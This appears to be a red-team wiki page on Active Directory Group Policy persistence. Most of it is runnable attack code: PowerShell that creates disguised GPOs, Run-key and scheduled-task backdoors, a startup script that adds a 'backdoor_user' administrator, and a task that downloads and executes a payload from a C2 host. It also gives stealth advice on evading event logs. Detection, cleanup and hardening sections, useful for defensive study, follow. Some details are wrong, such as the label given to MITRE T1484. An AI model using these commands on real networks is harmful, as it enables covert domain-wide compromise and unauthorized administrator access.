# Group Policy Persistence

## Overview

**Group Policy** is the primary mechanism for configuring Windows and application settings in Active Directory. By creating or modifying Group Policy Objects (GPOs), an attacker can achieve **domain-wide persistence** — executing code, installing backdoors, or modifying registry keys on every machine in the domain (or a targeted subset) every time Group Policy refreshes.

GPOs refresh every **90–120 minutes** by default (plus a random offset of 0–30 minutes). A `gpupdate /force` triggers immediate execution.

**Key Advantage:** GPO-based persistence is extremely stealthy because:
- GPOs are an administrative function, not inherently malicious
- Changes blend in with legitimate policy modifications
- Can target specific OUs (Domain Controllers, Workstations, Servers)
- Survives reboots and OS reinstalls (as long as the machine is domain-joined)

---

## Prerequisites

- **Domain Admin** privileges (to create or modify GPOs)
- **Group Policy Management Console** (GPMC) or PowerShell Group Policy module
- Access to SYSVOL (for file-based GPO modifications)
- Tools: PowerShell (`GroupPolicy` module), `Set-GPPrefRegistryValue`, `New-GPO`, `New-GPLink`

---

## Step 1: Create a Malicious GPO

### Using PowerShell (GroupPolicy Module)

```powershell
# Import the GroupPolicy module
Import-Module GroupPolicy

# Create a new GPO
$gpo = New-GPO -Name "Windows Update Policy - SEC" -Comment "Legitimate-looking display name"

# Link the GPO to the Domain Controllers OU (or target OU)
New-GPLink -Name "Windows Update Policy - SEC" -Target "OU=Domain Controllers,DC=targetdomain,DC=local" -LinkEnabled Yes

# Or link to the entire domain
New-GPLink -Name "Windows Update Policy - SEC" -Target "DC=targetdomain,DC=local" -LinkEnabled Yes
```

### Using Group Policy Management Console (GUI)

1. Open **Group Policy Management Console** (GPMC)
2. Right-click **Group Policy Objects** → **New**
3. Give it a legitimate name (e.g., "Windows Update Policy", "McAfee Deployment", "Chrome Settings")
4. Right-click the target OU → **Link an Existing GPO** → Select your GPO

---

## Step 2: Deploy the Backdoor via GPO

### Method A: Registry Run Key (Startup Persistence)

**Set a registry value under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`:**

```powershell
Set-GPPrefRegistryValue -Name "Windows Update Policy - SEC" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "WindowsUpdateSvc" -Value "powershell.exe -WindowStyle Hidden -EncodedCommand <base64_encoded_command>" -Type String
```

### Method B: Scheduled Task via GPO

Using XML-based scheduled task deployment:

```xml
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Author>NT AUTHORITY\SYSTEM</Author>
    <Description>Windows Update Check</Description>
  </RegistrationInfo>
  <Triggers>
    <LogonTrigger>
      <Enabled>true</Enabled>
    </LogonTrigger>
    <CalendarTrigger>
      <StartBoundary>2024-01-01T09:00:00</StartBoundary>
      <Repetition>
        <Interval>PT01H</Interval>
        <Duration>P1D</Duration>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <Enabled>true</Enabled>
    </CalendarTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <UserId>NT AUTHORITY\SYSTEM</UserId>
      <LogonType>S4U</LogonType>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-EncodedCommand <base64_payload></Arguments>
    </Exec>
  </Actions>
</Task>
```

Save as `WindowsUpdate.xml` and deploy via GPO Preferences:

```powershell
# Copy the XML to SYSVOL
$gpoPath = "\\targetdomain.local\SYSVOL\targetdomain.local\Policies\{$($gpo.Id)}\Machine\Preferences\ScheduledTasks"
New-Item -ItemType Directory -Path $gpoPath -Force
Copy-Item WindowsUpdate.xml -Destination "$gpoPath\WindowsUpdate.xml"
```

### Method C: Startup/Shutdown Script via GPO

**Copy a script to SYSVOL:**

```powershell
# The GPO script path in SYSVOL
$scriptPath = "\\targetdomain.local\SYSVOL\targetdomain.local\Policies\{$($gpo.Id)}\Machine\Scripts\Startup"
New-Item -ItemType Directory -Path $scriptPath -Force

# Write the backdoor script
@"
@echo off
powershell.exe -WindowStyle Hidden -Command "net user backdoor_user Pass123! /add && net localgroup Administrators backdoor_user /add"
"@ | Out-File "$scriptPath\WindowsUpdateInit.bat" -Encoding ascii
```

**Register the script with the GPO:**

```powershell
# Use Set-GPPrefRegistryValue to point to the script, or use GPMC GUI
# Or use xml manipulation of the GPO's GPT.INI and scripts.ini

# Simpler approach: use the GPO script extension
$gpo = Get-GPO -Name "Windows Update Policy - SEC"
$gpo.Computer.StartupScripts.Add("WindowsUpdateInit.bat")
$gpo.Computer.StartupScripts.Save()
```

### Method D: Immediate Task (Windows 10/11, Server 2016+)

**Create an immediate task that runs once at boot:**

```powershell
# Create an XML for immediate task (runs at boot, then self-deletes)
$taskXml = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Description>Windows Update</Description>
  </RegistrationInfo>
  <Triggers>
    <BootTrigger>
      <Enabled>true</Enabled>
      <Delay>PT30S</Delay>
    </BootTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <RunLevel>HighestAvailable</RunLevel>
      <UserId>NT AUTHORITY\SYSTEM</UserId>
      <LogonType>S4U</LogonType>
    </Principal>
  </Principals>
  <Actions Context="Author">
    <Exec>
      <Command>powershell.exe</Command>
      <Arguments>-WindowStyle Hidden -Command "iex (New-Object Net.WebClient).DownloadString('http://c2server/payload.ps1')"</Arguments>
    </Exec>
  </Actions>
  <Settings>
    <ExecutionTimeLimit>PT10M</ExecutionTimeLimit>
    <DeleteExpiredTaskAfter>PT1S</DeleteExpiredTaskAfter>
  </Settings>
</Task>
"@
```

---

## Step 3: Trigger the GPO

### Wait for automatic refresh (90–120 min)

### Force immediate refresh

```cmd
gpupdate /force
```

Or on a remote machine:

```cmd
Invoke-GPUpdate -Computer "TARGET-PC" -RandomDelayInMinutes 0
```

```cmd
gpupdate /force /target:computer /waittime:0
```

---

## Step 4: Verify the Backdoor

```powershell
Get-GPO -Name "Windows Update Policy - SEC" | Get-GPOReport -ReportType HTML | Out-File gpo_report.html
```

Check registry on the target machine:

```cmd
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Run"
```

Verify user creation:

```cmd
net user backdoor_user
net localgroup Administrators
```

---

## Alternative: Modify an Existing GPO (More Stealthy)

Instead of creating a new GPO (which is logged as event 5137), modify an **existing** GPO that is already deployed. Legitimate GPO targets include:

- "Default Domain Policy"
- "Default Domain Controllers Policy"
- "Windows Update Policy"
- "BitLocker Policy"
- "AppLocker Policy"

### Add Registry Setting to Existing GPO

```powershell
# Get an existing GPO name
$existingGpo = Get-GPO -Name "Default Domain Policy"

# Add the backdoor registry key
Set-GPPrefRegistryValue -Name "Default Domain Policy" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "WindowsSvcHost" -Value "powershell.exe ..." -Type String
```

---

## Advanced: GPO File-Based Backdoor (Direct SYSVOL Access)

GPO settings are stored in SYSVOL at:
```
\\<domain>\SYSVOL\<domain>\Policies\{GPO-GUID}\
```

Directly edit the GPO files:

**Registry.pol** (contains registry settings):
```cmd
\\<domain>\SYSVOL\<domain>\Policies\{GPO-GUID}\Machine\registry.pol
```

**Scripts.ini** (startup/shutdown scripts):
```cmd
\\<domain>\SYSVOL\<domain>\Policies\{GPO-GUID}\Machine\Scripts\scripts.ini
```

**GPT.INI** (GPO version tracking):
```cmd
\\<domain>\SYSVOL\<domain>\Policies\{GPO-GUID}\GPT.INI
```

### Manual GPO Version Update

After modifying files, increment the version in `GPT.INI`:

```ini
[General]
Version=131073  ; Increment this
```

You also need to increment the `versionNumber` and `userVersion`/`computerVersion` attributes on the `CN=Policy` AD object. The version controls whether clients apply the GPO.

---

## OPSEC / Stealth Considerations

| Factor | Consideration |
|--------|---------------|
| **New GPO Creation** | Event 5137 (Directory Service Object Created) for the GPO. |
| **GPO Modification** | Event 5136 (Directory Service Object Modified) for GPO changes. |
| **GPO Linking** | A new link generates event 5136 on the target OU. Modify an existing GPO instead. |
| **GPO Name** | Use legitimate names: "Windows Update Policy", "Chrome Settings", "MS Security Updates". |
| **SYSVOL Changes** | File modifications in SYSVOL are replicated to all DCs and are visible forensically. |
| **Version Tracking** | Each GPO has a version number. Mismatches between AD and SYSVOL are suspicious. |
| **Target Selection** | Broad targeting (entire domain) increases detection. Target specific OUs (e.g., Workstations). |
| **Script File Analysis** | Startup scripts in SYSVOL are readable by all domain users. Encoded or obfuscated payloads are recommended. |

---

## Detection

### Event Logs to Monitor

| Event ID | Description | Where |
|----------|-------------|-------|
| **5136** | Directory Service Object Modified (GPO link, GPO attributes) | DC Security Log |
| **5137** | Directory Service Object Created (new GPO) | DC Security Log |
| **5141** | Directory Service Object Deleted (GPO removed) | DC Security Log |
| **4727** | Security-enabled global group created | DC Security Log |
| **4728** | Member added to security-enabled global group | DC Security Log |
| **4688** | Process creation (script execution via GPO) | Target machine Security Log |
| **4698** | Scheduled task created (via GPO) | Target machine Security Log |
| **4719** | Windows Filtering Platform (if firewall rules via GPO) | Target machine |

### Detection Indicators

1. **New GPO created with link to Domain Controllers OU** — Very suspicious
2. **GPO with startup scripts or registry run keys** — Monitor for scripts in SYSVOL
3. **Anomalous scheduled tasks** — Tasks created by GPO with unusual names or payloads
4. **Registry modifications via GPO** — Adding run keys via Group Policy Preferences
5. **GPO version mismatches** — Event 1058 (grouppolicy) if files can't be read
6. **Unusual GPO propagation** — Monitor for GPO changes that happen outside of change windows

### Detection Queries

**KQL — New GPO Creation:**

```
SecurityEvent
| where EventID == 5137
| where ObjectDN contains "CN=Policies,CN=System"
```

**KQL — GPO Registry Run Key Detection:**

Search for GPO registry settings that set `CurrentVersion\Run`:

```
SecurityEvent
| where EventID == 5136
| where ObjectDN contains "CN=Policies,CN=System"
| where AttributeValue contains "CurrentVersion\\Run" or AttributeValue contains "CurrentVersion\\RunOnce"
```

**Check SYSVOL for Scripts:**

```powershell
# Look for scripts in GPO folders
Get-ChildItem -Path "\\targetdomain.local\SYSVOL\targetdomain.local\Policies" -Recurse -Filter *.bat,*.ps1,*.vbs,*.exe | Where-Object { $_.DirectoryName -match "Scripts" }
```

### File Integrity Monitoring

Monitor SYSVOL for new or modified files in GPO folders:

- `\\domain\SYSVOL\*\Policies\*\Machine\Scripts\*`
- `\\domain\SYSVOL\*\Policies\*\User\Scripts\*`
- `\\domain\SYSVOL\*\Policies\*\Machine\registry.pol`
- `\\domain\SYSVOL\*\Policies\*\User\registry.pol`

---

## Cleanup / Reversal

### Remove the Malicious GPO

```powershell
# Remove the GPO link first
Remove-GPLink -Name "Windows Update Policy - SEC" -Target "OU=Domain Controllers,DC=targetdomain,DC=local" -LinkEnabled Yes

# Delete the GPO entirely
Remove-GPO -Name "Windows Update Policy - SEC"
```

### Reverse Registry Changes

```powershell
# Remove the malicious registry run key via GPO
Set-GPPrefRegistryValue -Name "Windows Update Policy - SEC" -Context Computer -Action Delete -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "WindowsUpdateSvc"
```

### Remove Startup Scripts

```powershell
$gpo = Get-GPO -Name "Windows Update Policy - SEC"
$gpo.Computer.StartupScripts.Remove("WindowsUpdateInit.bat")
$gpo.Computer.StartupScripts.Save()
```

Then delete the script from SYSVOL:

```powershell
$scriptPath = "\\targetdomain.local\SYSVOL\targetdomain.local\Policies\{$($gpo.Id)}\Machine\Scripts\Startup\WindowsUpdateInit.bat"
Remove-Item $scriptPath -Force
```

### Remove Scheduled Tasks (on affected machines)

```powershell
schtasks /delete /tn "WindowsUpdateCheck" /f
```

### Remove Created Backdoor Users

```powershell
Remove-ADUser -Identity backdoor_user -Confirm:$false
```

### Verify Cleanup

```powershell
# Check no GPOs remain with the name
Get-GPO -Name "Windows Update Policy - SEC" -ErrorAction SilentlyContinue

# Verify registry keys removed
Get-ItemProperty "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Force GPO update to clean all machines
```

### Post-Cleanup

- Review all GPOs for unauthorized modifications (compare against backup/baseline)
- Check all OUs for unauthorized GPO links
- Audit SYSVOL for any remaining script files or registry.pol modifications
- Review the `Default Domain Policy` and `Default Domain Controllers Policy` for tampering
- Consider enabling **Group Policy auditing** via Advanced Audit Policy:
  ```
  Computer Configuration > Windows Settings > Security Settings > Advanced Audit Policy > Detailed Tracking > Audit Process Creation
  ```

---

## Defenses Against GPO Backdoors

### GPO Auditing

Enable auditing on all GPO objects in AD:

```powershell
# Audit GPO modifications on the Policies container
$path = "AD:CN=Policies,CN=System,DC=targetdomain,DC=local"
$acl = Get-Acl $path
$auditRule = New-Object System.DirectoryServices.ActiveDirectoryAuditRule("Everyone", "WriteProperty", "Success", "All")
$acl.AddAuditRule($auditRule)
Set-Acl -Path $path -AclObject $acl
```

### GPO Delegation Review

```powershell
# Check who can modify GPOs
$gpos = Get-GPO -All
foreach ($gpo in $gpos) {
    Get-GPPermissions -Guid $gpo.Id -All | Select-Object Trustee, Permission, Inherited
}
```

### SYSVOL Monitoring

- Enable file auditing on SYSVOL
- Use Windows File Server Resource Manager (FSRM) to block script execution in GPO folders
- Deploy **Honeytokens** (fake GPOs with monitoring)

### Best Practices

1. **Limit GPO modification rights** — Only Domain Admins and delegated GPO admins
2. **Use AGPM (Advanced Group Policy Management)** — Version control and approval workflows
3. **Baseline GPO checksums** — Compare GPO GUIDs and versions against known good values
4. **Regular GPO reporting** — Export all GPOs and diff against baselines
5. **Separate OU structure** — Production GPOs from test/development

---

## GROUP POLICY PERSISTENCE CHEAT SHEET

### Create GPO with Registry Run Key

```powershell
$gpo = New-GPO -Name "Windows Update Policy"
New-GPLink -Name "Windows Update Policy" -Target "OU=Workstations,DC=targetdomain,DC=local"
Set-GPPrefRegistryValue -Name "Windows Update Policy" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "SvcHost" -Value "powershell.exe -C payload" -Type String
```

### Add Startup Script to Existing GPO

```powershell
$gpo = Get-GPO -Name "Default Domain Policy"
$gpo.Computer.StartupScripts.Add("backdoor.ps1")
$gpo.Computer.StartupScripts.Save()
# Copy script to: \\domain\SYSVOL\domain\Policies\{gpo-id}\Machine\Scripts\Startup\
```

### Force GPO Update on Remote Machine

```cmd
Invoke-GPUpdate -Computer TARGET-PC -RandomDelayInMinutes 0
```

### Create Immediate Scheduled Task via GPO

Deploy via Preference XML in:
```
\\domain\SYSVOL\domain\Policies\{gpo-id}\Machine\Preferences\ScheduledTasks\
```

---

## References

- [Microsoft Group Policy Documentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2008-R2-and-2008/cc725828(v=ws.11))
- [PowerShell GroupPolicy Module Cmdlets](https://docs.microsoft.com/en-us/powershell/module/grouppolicy/)
- [Harmj0y — GPO Persistence](http://blog.harmj0y.net/redteaming/abusing-gpo-permissions/)
- [MITRE ATT&CK: T1484 (Group Policy Discovery)](https://attack.mitre.org/techniques/T1484/)
- MITRE ATT&CK: T1053.005 (Scheduled Task/Job: Scheduled Task)
- MITRE ATT&CK: T1059.001 (Command and Scripting Interpreter: PowerShell)

---

**Back to:** [README](README.md)
